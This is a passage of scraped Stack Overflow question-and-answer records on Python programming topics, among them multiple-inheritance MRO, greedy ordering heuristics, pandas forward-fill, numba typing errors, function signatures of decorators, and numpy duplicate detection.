print(f&quot;My name is {ws.name} {ws.last_name}. I'm a {ws.position} and I'm {ws.age} years old.&quot;)
# My name is john brown. I'm a Programmer and I'm 18 years old.
</code></pre>
<p>Check mro:</p>
<pre><code>WorkingStudent.__mro__
(__main__.WorkingStudent,
 __main__.Student,
 __main__.Employee,
 __main__.Person,
 object)
</code></pre>
<hr />
<p>When you create an instance of WorkingStudent, it's better if you pass keyword arguments so that you don't have to worry about messing up the order of arguments.</p>
<p>Since WorkingStudent defers the definition of attributes to parent classes, immediately pass all arguments up the hierarchy using <code>super().__init__(**kwargs)</code> since a child class doesn't need to know about the parameters it doesn't handle. The first parent class is Student, so self.IndexNr etc are defined there. The next parent class in the mro is Employee, so from Student, pass the remaining keyword arguments to it, using <code>super().__init__(**kwargs)</code> yet again. From Employee, define the attributes defined there and pass the rest along the mro (to Person) via <code>super().__init__(**kwargs)</code> yet again.</p>
<pre><code>class Person:
    def __init__(self, name, last_name, age):
        self.name = name
        self.last_name = last_name
        self.age = age 

class Student(Person):
    def __init__(self, indexNr, notes, **kwargs):
        # since Employee comes after Student in the mro, pass its arguments using super
        super().__init__(**kwargs)
        self.indexNr = indexNr
        self.notes = notes

class Employee(Person):
    def __init__(self, salary, position, **kwargs):
        super().__init__(**kwargs)
        self.salary = salary
        self.position = position

class WorkingStudent(Student, Employee):
    def __init__(self, **kwargs):
        # pass all arguments along the mro
        super().__init__(**kwargs)

# keyword arguments (not positional arguments like the case above)
ws = WorkingStudent(name=&quot;john&quot;, last_name=&quot;brown&quot;, age=18, indexNr=1, notes=[1,2,3], salary=1000, position='Programmer')
</code></pre>
"
"71886600","1","Algorithm for ordering data so that neighbor elements are as identical as possible","<p>I have a (potentially large) list <code>data</code> of 3-tuples of small non-negative integers, like</p>
<pre class=""lang-py prettyprint-override""><code>data = [
    (1, 0, 5),
    (2, 4, 2),
    (3, 2, 1),
    (4, 3, 4),
    (3, 3, 1),
    (1, 2, 2),
    (4, 0, 3),
    (0, 3, 5),
    (1, 5, 1),
    (1, 5, 2),
]
</code></pre>
<p>I want to order the tuples within <code>data</code> so that neighboring tuples (<code>data[i]</code> and <code>data[i+1]</code>) are &quot;as similar as possible&quot;.</p>
<p><a href=""https://en.wikipedia.org/wiki/Hamming_distance"" rel=""nofollow noreferrer"">Define</a> the <em>dis</em>similarity of two 3-tuples as the number of elements which are unequal between them. E.g.</p>
<ul>
<li><code>(0, 1, 2)</code> vs. <code>(0, 1, 2)</code>: Dissimilarity <code>0</code>.</li>
<li><code>(0, 1, 2)</code> vs. <code>(0, 1, 3)</code>: Dissimilarity <code>1</code>.</li>
<li><code>(0, 1, 2)</code> vs. <code>(0, 2, 1)</code>: Dissimilarity <code>2</code>.</li>
<li><code>(0, 1, 2)</code> vs. <code>(3, 4, 5)</code>: Dissimilarity <code>3</code>.</li>
<li><code>(0, 1, 2)</code> vs. <code>(2, 0, 1)</code>: Dissimilarity <code>3</code>.</li>
</ul>
<p><strong>Question</strong>: What is a good algorithm for finding the ordering of <code>data</code> which minimizes the sum of dissimilarities between all neighboring 3-tuples?</p>
<h3>Some code</h3>
<p>Here's a function which computes the dissimilarity between two 3-tuples:</p>
<pre class=""lang-py prettyprint-override""><code>def dissimilar(t1, t2):
    return sum(int(a != b) for a, b in zip(t1, t2))
</code></pre>
<p>Here's a function which computes the summed total dissimilarity of <code>data</code>, i.e. the number which I seek to minimize:</p>
<pre class=""lang-py prettyprint-override""><code>def score(data):
    return sum(dissimilar(t1, t2) for t1, t2 in zip(data, data[1:]))
</code></pre>
<p>The problem can be solved by simply running <code>score()</code> over every permutation of <code>data</code>:</p>
<pre class=""lang-py prettyprint-override""><code>import itertools
n_min = 3*len(data)  # some large number
for perm in itertools.permutations(data):
    n = score(perm)
    if n &lt; n_min:
        n_min = n
        data_sorted = list(perm)
print(data_sorted, n_min)
</code></pre>
<p>Though the above works, it's very slow as we explicitly check each and every permutation (resulting in O(N!) complexity). On my machine the above takes about 20 seconds when <code>data</code> has 10 elements.</p>
<p>For completeness, here's the result of running the above given the example <code>data</code>:</p>
<pre class=""lang-py prettyprint-override""><code>data_sorted = [
    (1, 0, 5),
    (4, 0, 3),
    (4, 3, 4),
    (0, 3, 5),
    (3, 3, 1),
    (3, 2, 1),
    (1, 5, 1),
    (1, 5, 2),
    (1, 2, 2),
    (2, 4, 2),
]
</code></pre>
<p>with <code>n_min = 15</code>. Note that several other orderings (<code>10</code> in total) with a score of <code>15</code> exist. For my purposes these are all equivalent and I just want one of them.</p>
<h3>Final remarks</h3>
<p>In practice the size of <code>data</code> may be as large as say <code>10000</code>.</p>
<p>The sought-after algorithm should beat O(N!), i.e. probably be polynomial in time (and space).</p>
<p>If no such algorithm exists, I would be interested in &quot;near-solutions&quot;, i.e. a fast algorithm which gives an ordering of <code>data</code> with a small but not necessarily minimal total score. One such algorithm would be <a href=""https://en.wikipedia.org/wiki/Lexicographic_order"" rel=""nofollow noreferrer"">lexicographic sorting</a>, i.e.</p>
<pre class=""lang-py prettyprint-override""><code>sorted(data)  # score 18
</code></pre>
<p>though I hope to be able to do better than this.</p>
<h3>Edit (comments on accepted solution)</h3>
<p>I have tried all of the below heuristic solutions given as code (I have not tried e.g. Google OR-tools). For large <code>len(data)</code>, I find that the solution of Andrej Kesely is both quick and gives the best results.</p>
<p>The idea behind this method is quite simple. The sorted list of data elements (3-tuples) is built up one by one. Given some data element, the next element is chosen to be the most similar one out of the remaining (not yet part of the sorted) data.</p>
<p>Essentially this solves a localized version of the problem where we only &quot;look <em>one</em> ahead&quot;, rather than optimizing globally over the entire data set. We can imagine a hierarchy of algorithms looking <code>n</code> ahead, each successively delivering better (or at least as good) results but at the cost of being much more expensive. The solution of Andrej Kesely then sits lowest in this hierarchy. The algorithm at the highest spot, looking <code>len(data)</code> ahead, solves the problem exactly.</p>
<p>Let's settle for &quot;looking 1 ahead&quot;, i.e. the answer by Andrej Kesely. This leaves room for a) the choice of initial element, b) what to do when several elements are equally good candidates (same dissimilarity) for use as the next one. Choosing the first element in <code>data</code> as the initial element and the first occurrence of an element with minimal dissimilarity, both a) and b) are determined from the original order of elements within <code>data</code>. As Andrej Kesely points out, it then helps to (lex)sort <code>data</code> in advance.</p>
<p>In the end I went with this solution, but refined in a few ways:</p>
<ul>
<li>I try out the algorithm for 6 initial sortings of <code>data</code>; lex sort for columns <code>(0, 1, 2)</code>, <code>(2, 0, 1)</code>, <code>(1, 2, 0)</code>, all in ascending as well as descending order.</li>
<li>For large <code>len(data)</code>, the algorithm becomes too slow for me. I suspect it scales like <code>O(n²)</code>. I thus process chunks of the data of size <code>n_max</code> independently, with the final result being the different sorted chunks concatenated. Transitioning from one chunk to the next we expect a dissimilarity of 3, but this is unimportant if we keep <code>n_max</code> large. I go with <code>n_max = 1000</code>.</li>
</ul>
<p>As an implementation note, the performance can be improved by not using <code>data.pop(idx)</code> as this itself is <code>O(n)</code>. Instead, either leave the original <code>data</code> as is and use another data structure for keeping track of which elements/indices have been used, or replace <code>data[idx]</code> with some marker value upon use.</p>
","71890278","<p>This isn't exact algorithm, just heuristic, but should be better that naive sorting:</p>
<pre class=""lang-py prettyprint-override""><code># you can sort first the data for lower total average score:
# data = sorted(data)

out = [data.pop(0)]
while data:
    idx, t = min(enumerate(data), key=lambda k: dissimilar(out[-1], k[1]))
    out.append(data.pop(idx))


print(score(out))
</code></pre>
<hr />
<p>Testing (100 repeats with data <code>len(data)=1000</code>):</p>
<pre class=""lang-py prettyprint-override""><code>import random
from functools import lru_cache


def get_data(n=1000):
    f = lambda n: random.randint(0, n)
    return [(f(n // 30), f(n // 20), f(n // 10)) for _ in range(n)]


@lru_cache(maxsize=None)
def dissimilar(t1, t2):
    a, b, c = t1
    x, y, z = t2
    return (a != x) + (b != y) + (c != z)


def score(data):
    return sum(dissimilar(t1, t2) for t1, t2 in zip(data, data[1:]))


def lexsort(data):
    return sorted(data)


def heuristic(data, sort_data=False):
    data = sorted(data) if sort_data else data[:]
    out = [data.pop(0)]
    while data:
        idx, t = min(enumerate(data), key=lambda k: dissimilar(out[-1], k[1]))
        out.append(data.pop(idx))
    return out


N, total, total_lexsort, total_heuristic, total_heuristic2 = 100, 0, 0, 0, 0
for i in range(N):
    data = get_data()
    r0 = score(data)
    r1 = score(lexsort(data))
    r2 = score(heuristic(data))
    r3 = score(heuristic(data, True))
    print(&quot;original data&quot;, r0)
    print(&quot;lexsort&quot;, r1)
    print(&quot;heuristic&quot;, r2)
    print(&quot;heuristic with sorted&quot;, r3)

    total += r0
    total_lexsort += r1
    total_heuristic += r2
    total_heuristic2 += r3

print(&quot;total original data score&quot;, total)
print(&quot;total score lexsort&quot;, total_lexsort)
print(&quot;total score heuristic&quot;, total_heuristic)
print(&quot;total score heuristic(with sorted)&quot;, total_heuristic2)
</code></pre>
<p>Prints:</p>
<pre class=""lang-none prettyprint-override""><code>...

total original data score 293682
total score lexsort 178240
total score heuristic 162722
total score heuristic(with sorted) 160384
</code></pre>
"
"72312594","1","Pandas forward fill, but only between equal values","<p>I have two data frames: main and auxiliary. I am concatenating auxiliary to the main. It results in NaN in a few rows and I want to fill them, not all.
Code:</p>
<pre><code>df1 = pd.DataFrame({'Main':[00,10,20,30,40,50,60,70,80]})
df1 = 
   Main
0     0
1    10
2    20
3    30
4    40
5    50
6    60
7    70
8    80
df2 = pd.DataFrame({'aux':['aa','aa','bb','bb']},index=[0,2,5,7])
df2 = 
  aux
0   aa  
2   aa
5   bb
7   bb
df = pd.concat([df1,df2],axis=1)
# After concating, in the aux column, I want to fill the NaN rows in between 
# the rows with same value. Example, fill rows between 0 and 2 with 'aa', 2 and 5 NaN, 5 and 7 with 'bb'
df = pd.concat([df1,df2],axis=1).fillna(method='ffill')
print(df)
</code></pre>
<p>Present result:</p>
<pre><code>  Main aux
0    0   aa
1   10   aa
2   20   aa
3   30   aa # Wrong, here it should be NaN
4   40   aa # Wrong, here it should be NaN
5   50   bb 
6   60   bb
7   70   bb
8   80   bb # Wrong, here it should be NaN
</code></pre>
<p>Expected result:</p>
<pre><code>  Main aux
0    0   aa
1   10   aa
2   20   aa
3   30  NaN
4   40  NaN
5   50   bb
6   60   bb
7   70   bb
8   80  NaN
</code></pre>
","72312653","<p>If I understand correctly, what you want can be done like this. You want to fill the NaNs where backfill and forward fill give the same value.</p>
<pre><code>ff = df.aux.ffill()
bf = df.aux.bfill()
df.aux = ff[ff == bf]
</code></pre>
"
"71709229","1","VSCode debugger can not import queue due to shadowing","<p>When I try to run any python code in debug mode using VScode, I got an error message saying:</p>
<pre><code>42737 -- /home/&lt;username&gt;/Desktop/development/bopi/experiment_handler.py .vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/launcher 4
Traceback (most recent call last):
  File &quot;/usr/lib/python2.7/runpy.py&quot;, line 174, in _run_module_as_main
    &quot;__main__&quot;, fname, loader, pkg_name)
  File &quot;/usr/lib/python2.7/runpy.py&quot;, line 72, in _run_code
    exec code in run_globals
  File &quot;/home/&lt;username&gt;/.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/__main__.py&quot;, line 43, in &lt;module&gt;
    from debugpy.server import cli
  File &quot;/home/&lt;username&gt;/.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/../debugpy/server/__init__.py&quot;, line 9, in &lt;module&gt;
    import debugpy._vendored.force_pydevd  # noqa
  File &quot;/home/&lt;username&gt;/.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/../debugpy/_vendored/force_pydevd.py&quot;, line 37, in &lt;module&gt;
    pydevd_constants = import_module('_pydevd_bundle.pydevd_constants')
  File &quot;/usr/lib/python2.7/importlib/__init__.py&quot;, line 37, in import_module
    __import__(name)
  File &quot;/home/&lt;username&gt;/.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydevd_bundle/pydevd_constants.py&quot;, line 362, in &lt;module&gt;
    from _pydev_bundle._pydev_saved_modules import thread, threading
  File &quot;/home/&lt;username&gt;/.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydev_bundle/_pydev_saved_modules.py&quot;, line 97, in &lt;module&gt;
    import queue as _queue;    verify_shadowed.check(_queue, ['Queue', 'LifoQueue', 'Empty', 'Full', 'deque'])
  File &quot;/home/&lt;username&gt;/.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydev_bundle/_pydev_saved_modules.py&quot;, line 75, in check
    raise DebuggerInitializationError(msg)
_pydev_bundle._pydev_saved_modules.DebuggerInitializationError: It was not possible to initialize the debugger due to a module name conflict.

i.e.: the module &quot;queue&quot; could not be imported because it is shadowed by:
/home/&lt;username&gt;/.local/lib/python2.7/site-packages/queue/__init__.pyc
Please rename this file/folder so that the original module from the standard library can be imported.
</code></pre>
<p>Deleting the <strong>init</strong>.pyc and <strong>init</strong>.py resulting with an error message about missing queue import.</p>
","71711905","<p>Downgrading my Python extension in Visual Studio Code to <code>v2022.2.1924087327</code> worked for me.</p>
<p>Elevating <a href=""https://stackoverflow.com/questions/71709229/vscode-debugger-can-not-import-queue-due-to-shadowing/71711905#comment126743454_71711905"">@Onur Berk's comment below</a> as part of the answer:</p>
<blockquote>
<p>Its is very easy to downgrade the python extension, just click 'extensions' and find the Python extension and select it. Rather than clicking 'uninstall' click the arrow next to it, this will give you an option to install another version</p>
</blockquote>
"
"71902946","1","numba: No implementation of function Function(<built-in function getitem>) found for signature:","<p>I´m having a hard time implementing numba to my function.</p>
<p>Basically, I`d like to concatenate to arrays with 22 columns, if the new data hasn't been added yet. If there is no old data, the new data should become a 2d array.</p>
<p>The function works fine without the decorator:</p>
<pre><code>@jit(nopython=True)
def add(new,original=np.array([])):
  duplicate=True
  if original.size!=0:
    for raw in original:
      for ii in range(11,19):
        if raw[ii]!=new[ii]:
          duplicate=False
    if duplicate==False:
      res=np.zeros((original.shape[0]+1,22))
      res[:original.shape[0]]=original
      res[-1]=new
      return res
    else:
      return original
  else:
    res=np.zeros((1,22))
    res[0]=new
    return res
</code></pre>
<p>Also if I remove the last part of the code:</p>
<pre><code>  else:
    res=np.zeros((1,22))
    res[0]=new
    return res
</code></pre>
<p>It would work with njit</p>
<p>So if I ignore the case, that there hasn´t been old data yet, everything would be fine.</p>
<p>FYI: the data I`m passing in is mixed float and np.nan.</p>
<p>Anybody an idea?
Thank you so much in advance!</p>
<p>this is my error log:</p>
<pre><code>---------------------------------------------------------------------------
TypingError                               Traceback (most recent call last)
&lt;ipython-input-255-d05a5f4ea944&gt; in &lt;module&gt;()
     19     return res
     20 #add(a,np.array([b]))
---&gt; 21 add(a)

2 frames
/usr/local/lib/python3.7/dist-packages/numba/core/dispatcher.py in _compile_for_args(self, *args, **kws)
    413                 e.patch_message(msg)
    414 
--&gt; 415             error_rewrite(e, 'typing')
    416         except errors.UnsupportedError as e:
    417             # Something unsupported is present in the user code, add help info

/usr/local/lib/python3.7/dist-packages/numba/core/dispatcher.py in error_rewrite(e, issue_type)
    356                 raise e
    357             else:
--&gt; 358                 reraise(type(e), e, None)
    359 
    360         argtypes = []

/usr/local/lib/python3.7/dist-packages/numba/core/utils.py in reraise(tp, value, tb)
     78         value = tp()
     79     if value.__traceback__ is not tb:
---&gt; 80         raise value.with_traceback(tb)
     81     raise value
     82 

TypingError: Failed in nopython mode pipeline (step: nopython frontend)
No implementation of function Function(&lt;built-in function getitem&gt;) found for signature:
 
 &gt;&gt;&gt; getitem(float64, int64)
 
There are 22 candidate implementations:
      - Of which 22 did not match due to:
      Overload of function 'getitem': File: &lt;numerous&gt;: Line N/A.
        With argument(s): '(float64, int64)':
       No match.

During: typing of intrinsic-call at &lt;ipython-input-255-d05a5f4ea944&gt; (7)

File &quot;&lt;ipython-input-255-d05a5f4ea944&gt;&quot;, line 7:
def add(new,original=np.array([])):
    &lt;source elided&gt;
      for ii in range(11,19):
        if raw[ii]!=new[ii]:
        ^
</code></pre>
<p>Update:
Here is how it should work. The function shall cover three main cases</p>
<p>sample input for new data (1d array):</p>
<pre><code>array([9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,
       0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,
       9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,
       1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,
       9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,
                 nan,           nan])
</code></pre>
<p>sample input for original data (2d array):</p>
<pre><code>array([[4.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,
        0.00000000e+00,            nan, 5.23000000e-01, 8.31589755e-01,
        8.34804877e-01, 8.28374632e-01, 8.36090000e-01, 1.64938320e+09,
        1.64966400e+09, 1.64968920e+09, 1.64975760e+09, 8.30750000e-01,
        8.38020000e-01, 8.34290000e-01, 8.36090000e-01,            nan,
                   nan,            nan]])
</code></pre>
<ol>
<li>new data will be added and there is no original data</li>
</ol>
<pre><code>add(new)
Output:

array([[9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,
        0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,
        9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,
        1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,
        9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,
                  nan,           nan]])
</code></pre>
<ol start=""2"">
<li>new data will be added, which hasn´t already been added before and there is original data</li>
</ol>
<pre><code>add(new,original)
Output:
array([[4.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,
        0.00000000e+00,            nan, 5.23000000e-01, 8.31589755e-01,
        8.34804877e-01, 8.28374632e-01, 8.36090000e-01, 1.64938320e+09,
        1.64966400e+09, 1.64968920e+09, 1.64975760e+09, 8.30750000e-01,
        8.38020000e-01, 8.34290000e-01, 8.36090000e-01,            nan,
                   nan,            nan],
       [9.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,
        0.00000000e+00,            nan, 5.73000000e-01, 9.26054500e-01,
        9.31717250e-01, 9.20391750e-01, 9.34500000e-01, 1.64916360e+09,
        1.64942280e+09, 1.64969280e+09, 1.64975040e+09, 9.23770000e-01,
        9.37380000e-01, 9.30380000e-01, 9.34500000e-01,            nan,
                   nan,            nan]])

</code></pre>
<ol start=""3"">
<li>new data will be added, which already had been added before</li>
</ol>
<pre><code>add(new,original)
Output:

array([[9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,
        0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,
        9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,
        1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,
        9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,
                  nan,           nan]])
</code></pre>
","71903983","<p>The main issue is that Numba assumes that <code>original</code> is a <em>1D array</em> while this is not the case. The pure-Python code works because the <strong>interpreter</strong> it never execute the body of the loop <code>for raw in original</code> but Numba need to compile all the code before its execution. You can solve this problem using the following function prototype:</p>
<pre class=""lang-py prettyprint-override""><code>def add(new,original=np.array([[]])):  # Note the `[[]]` instead of `[]`
</code></pre>
<p>With that, Numba can deduce correctly that the <code>original</code> array is a 2D one.</p>
<p>Note that specifying the dimension and types of Numpy arrays and inputs is a good method to avoid such errors and sneaky bugs (eg. due to integer/float truncation).</p>
"
"71735869","1","How to reduce number if-statements using dict?","<p>I have the following code with multiple cases:</p>
<pre><code>def _extract_property_value(selector: Selector) -&gt; str:
    raw_value = selector.xpath(&quot;span[2]&quot;)

    default_value = raw_value.xpath(&quot;./text()&quot;).get().strip()
    value_with_a = ', '.join([value.strip() for value in raw_value.xpath(&quot;./a /text()&quot;).getall()])
    value_with_div_and_a = ', '.join([value.strip() for value in raw_value.xpath(&quot;./div /a /text()&quot;).getall()])

    if value_with_a:
        return value_with_a
    elif value_with_div_and_a:
        return value_with_div_and_a
    elif default_value:
        return default_value
</code></pre>
<p>I want to get rid of if-statements and simplify this code as much as it is possible. I am not good Pyton dev. I know there is pattern &quot;strategy&quot; and below I was trying to implement that:</p>
<pre><code>def _extract_property_value(selector: Selector) -&gt; str:
    raw_value = selector.xpath(&quot;span[2]&quot;)
    values_dict = {
        'default value': raw_value.xpath(&quot;./text()&quot;).get().strip(),
        'value with a': ', '.join([value.strip() for value in raw_value.xpath(&quot;./a /text()&quot;).getall()]),
        'value with div and a': ', '.join([value.strip() for value in raw_value.xpath(&quot;./div /a /text()&quot;).getall()])
    }
    return [item for item in values_dict.values() if item != ''][0]
</code></pre>
<p>but... Now when I think of this - that was bad idea to use strategy there. I am not sure. Can someone help me to simplify that code? Or those if-statements are just necessary.</p>
","71736271","<p>We can reduce the number of <em>if</em> statements but without the aid of a dictionary.</p>
<p>The code in question unconditionally assigns values to 3 variables. Having done so, those variables are examined to determine which, if any, is to be returned to the caller. However, there are no dependencies between those variables. Therefore they could be processed in order of priority and, if an appropriate value is acquired, then it could be returned immediately thereby making the process considerably more efficient.</p>
<pre><code>def _extract_property_value(selector):
    def f1(rv):
        return rv.xpath(&quot;./text()&quot;).get().strip()
    def f2(rv):
        return ', '.join([value.strip() for value in rv.xpath(&quot;./a /text()&quot;).getall()])
    def f3(rv):
        return ', '.join([value.strip() for value in rv.xpath(&quot;./div /a /text()&quot;).getall()])
    raw_value = selector.xpath(&quot;span[2]&quot;)
    for func in [f2, f3, f1]: # note the priority order - default last
        if (v := func(raw_value)):
            return v
</code></pre>
<p>The revised function will implicitly return None if suitable values are not found. In this respect it is no different to the OP's original code</p>
"
"71739870","1","How to install Python 2 on macOS 12.3+","<p>macOS 12.3 update drops Python 2 and replaces it with version 3:</p>
<p><a href=""https://developer.apple.com/documentation/macos-release-notes/macos-12_3-release-notes"" rel=""noreferrer"">https://developer.apple.com/documentation/macos-release-notes/macos-12_3-release-notes</a></p>
<blockquote>
<p>Python
Deprecations
Python 2.7 was removed from macOS in this update. Developers should use Python 3 or an alternative language instead. (39795874)</p>
</blockquote>
<p>I understand we need to migrate to version 3, but in the meantime we still need version 2. Homebrew does not seem to have it anymore:</p>
<pre class=""lang-none prettyprint-override""><code>brew install python@2.7
Warning: No available formula with the name &quot;python@2.7&quot;. Did you mean python@3.7, python@3.9, python@3.8, python@3.10 or python-yq?

brew install python2
Warning: No available formula with the name &quot;python2&quot;. Did you mean ipython, bpython, jython or cython?
</code></pre>
<p>What gives?</p>
","71740144","<p>You can get any Python release, including the last Python 2, from the official download site:</p>
<p><a href=""https://www.python.org/downloads/release/python-2718/"" rel=""noreferrer"">https://www.python.org/downloads/release/python-2718/</a> → <a href=""https://www.python.org/ftp/python/2.7.18/python-2.7.18-macosx10.9.pkg"" rel=""noreferrer"">macOS 64-bit installer</a></p>
"
"72204649","1","Single-file history format/library for binary files?","<p>My application is going to edit a bunch of large files, completely unrelated to each other (belonging to different users), and I need to store checkpoints of the previous state of the files.  Delta compression should work extremely well on this file format.  I only need a linear history, not branches or merges.</p>
<p>There are low-level libraries that give part of the solution, for example <code>xdelta3</code> <a href=""https://hackernoon.com/delta-compression-diff-algorithms-and-delta-file-formats-practical-guide-7v1p3uhz"" rel=""noreferrer"">sounds like a good binary diff/patch system</a>.</p>
<p><code>RCS</code> actually seems like a pretty close match to my problem, but doesn't handle binary files well.</p>
<p><code>git</code> provides a complete solution to my problem, but is an enormous suite of programs, and its storage format is an entire directory.</p>
<p>Is there anything less complicated than <code>git</code> that would:</p>
<ul>
<li>work on binary files</li>
<li>perform delta compression</li>
<li>let me commit new &quot;newest&quot; versions</li>
<li>let me recall old versions</li>
</ul>
<p>Bonus points if it would:</p>
<ul>
<li>have a single-file storage format</li>
<li>be available as a C, C++, or Python library</li>
</ul>
<p>I can't even find the right combination of words to google for this category of program, so that would also be helpful.</p>
","72343489","<p>From <a href=""https://www.gnu.org/software/rcs/manual/rcs.html#Overview"" rel=""nofollow noreferrer"">RCS manual (1. Overview)</a></p>
<blockquote>
<p>[RCS] can handle text as well as binary files, although functionality is reduced for the latter.</p>
</blockquote>
<p><code>RCS</code> seems a good option worth to try.</p>
<p>I work for a Foundation which has been using RCS to keep under version control tens of thousands of completely unrelated files (git or hg are not an option). Mostly text, but also some media files, which are binary in nature.</p>
<p><code>RCS</code> does work quite well with binary files, only make sure not to use the <a href=""https://www.gnu.org/software/rcs/manual/rcs.html#Substitution-mode-option"" rel=""nofollow noreferrer"">Substitute mode options</a>, to avoid inadvertently substituting binary bits that looks like <code>$ Id</code>.</p>
<p>To see if this could work for you, you could for example try with a Photoshop image, put it under version control with RCS. Then change a part, or add a layer, and commit the change. You could then verify how well <code>RCS</code> can manage binary files for you.</p>
<p><code>RCS</code> has been serving us quite well. It is well maintained, reliable, predictable, and definitely worth a try.</p>
"
"71990420","1","How do I efficiently find which elements of a list are in another list?","<p>I want to know which elements of <code>list_1</code> are in <code>list_2</code>. I need the output as an ordered list of booleans. But I want to avoid <code>for</code> loops, because both lists have over 2 million elements.</p>
<p>This is what I have and it works, but it's too slow:</p>
<pre><code>list_1 = [0,0,1,2,0,0]
list_2 = [1,2,3,4,5,6]

booleans = []
for i in list_1:
   booleans.append(i in list_2)

# booleans = [False, False, True, True, False, False]
</code></pre>
<p>I could split the list and use multithreading, but I would prefer a simpler solution if possible. I know some functions like sum() use vector operations. I am looking for something similar.</p>
<p>How can I make my code more efficient?</p>
","71990529","<p>If you want to use a vector approach you can also use Numpy isin. It's not the fastest method, as demonstrated by <a href=""https://stackoverflow.com/a/71990739/11647025"">oda's excellent post</a>, but it's definitely an alternative to consider.</p>
<pre class=""lang-py prettyprint-override""><code>import numpy as np

list_1 = [0,0,1,2,0,0]
list_2 = [1,2,3,4,5,6]

a1 = np.array(list_1)
a2 = np.array(list_2)

np.isin(a1, a2)
# array([False, False,  True,  True, False, False])
</code></pre>
"
"72236445","1","How can I wrap a python function in a way that works with with inspect.signature?","<p>Some uncontroversial background experimentation up front:</p>
<pre><code>import inspect

def func(foo, bar):
  pass

print(inspect.signature(func))  # Prints &quot;(foo, bar)&quot; like you'd expect

def decorator(fn):
  def _wrapper(baz, *args, *kwargs):
    fn(*args, **kwargs)

  return _wrapper

wrapped = decorator(func)
print(inspect.signature(wrapped))  # Prints &quot;(baz, *args, **kwargs)&quot; which is totally understandable
</code></pre>
<h2>The Question</h2>
<p>How can implement my decorator so that <code>print(inspect.signature(wrapped))</code> spits out &quot;(baz, foo, bar)&quot;?  Can I build <code>_wrapper</code> dynamically somehow by adding the arguments of whatever <code>fn</code> is passed in, then gluing <code>baz</code> on to the list?</p>
<p>The answer is NOT</p>
<pre><code>def decorator(fn):
  @functools.wraps(fn)
  def _wrapper(baz, *args, *kwargs):
    fn(*args, **kwargs)

  return _wrapper
</code></pre>
<p>That give &quot;(foo, bar)&quot; again - which is totally wrong.  Calling <code>wrapped(foo=1, bar=2)</code> is a type error - &quot;Missing 1 required positional argument: 'baz'&quot;</p>
<p>I don't think it's necessary to be this pedantic, but</p>
<pre><code>def decorator(fn):
  def _wrapper(baz, foo, bar):
    fn(foo=foo, bar=bar)

  return _wrapper
</code></pre>
<p>Is also not the answer I'm looking for - I'd like the decorator to work for all functions.</p>
","72242606","<p>You can use <code>__signature__</code> (<a href=""https://peps.python.org/pep-0362/"" rel=""nofollow noreferrer"">PEP</a>) attribute to modify returned signature of wrapped object. For example:</p>
<pre class=""lang-py prettyprint-override""><code>import inspect


def func(foo, bar):
    pass


def decorator(fn):
    def _wrapper(baz, *args, **kwargs):
        fn(*args, **kwargs)

    f = inspect.getfullargspec(fn)

    fn_params = []
    if f.args:
        for a in f.args:
            fn_params.append(
                inspect.Parameter(a, inspect.Parameter.POSITIONAL_OR_KEYWORD)
            )

    if f.varargs:
        fn_params.append(
            inspect.Parameter(f.varargs, inspect.Parameter.VAR_POSITIONAL)
        )

    if f.varkw:
        fn_params.append(
            inspect.Parameter(f.varkw, inspect.Parameter.VAR_KEYWORD)
        )

    _wrapper.__signature__ = inspect.Signature(
        [
            inspect.Parameter(&quot;baz&quot;, inspect.Parameter.POSITIONAL_OR_KEYWORD),
            *fn_params,
        ]
    )
    return _wrapper


wrapped = decorator(func)
print(inspect.signature(wrapped))
</code></pre>
<p>Prints:</p>
<pre class=""lang-py prettyprint-override""><code>(baz, foo, bar)
</code></pre>
<hr />
<p>If the func is:</p>
<pre class=""lang-py prettyprint-override""><code>def func(foo, bar, *xxx, **yyy):
    pass
</code></pre>
<p>Then <code>print(inspect.signature(wrapped))</code> prints:</p>
<pre class=""lang-py prettyprint-override""><code>(baz, foo, bar, *xxx, **yyy)
</code></pre>
"
"72804712","1","How to accelerate numpy.unique and provide both counts and duplicate row indices","<p>I am attempting to find duplicate rows in a numpy array.  The following code replicates the structure of my array which has n rows, m columns, and nz non-zero entries per row:</p>
<pre><code>import numpy as np
import random
import datetime


def create_mat(n, m, nz):
    sample_mat = np.zeros((n, m), dtype='uint8')
    random.seed(42)
    for row in range(0, n):
        counter = 0
        while counter &lt; nz:
            random_col = random.randrange(0, m-1, 1)
            if sample_mat[row, random_col] == 0:
                sample_mat[row, random_col] = 1
                counter += 1
    test = np.all(np.sum(sample_mat, axis=1) == nz)
    print(f'All rows have {nz} elements: {test}')
    return sample_mat
</code></pre>
<p>The code I am attempting to optimize is as follows:</p>
<pre><code>if __name__ == '__main__':
    threshold = 2
    mat = create_mat(1800000, 108, 8)

    print(f'Time: {datetime.datetime.now()}')
    unique_rows, _, duplicate_counts = np.unique(mat, axis=0, return_counts=True, return_index=True)
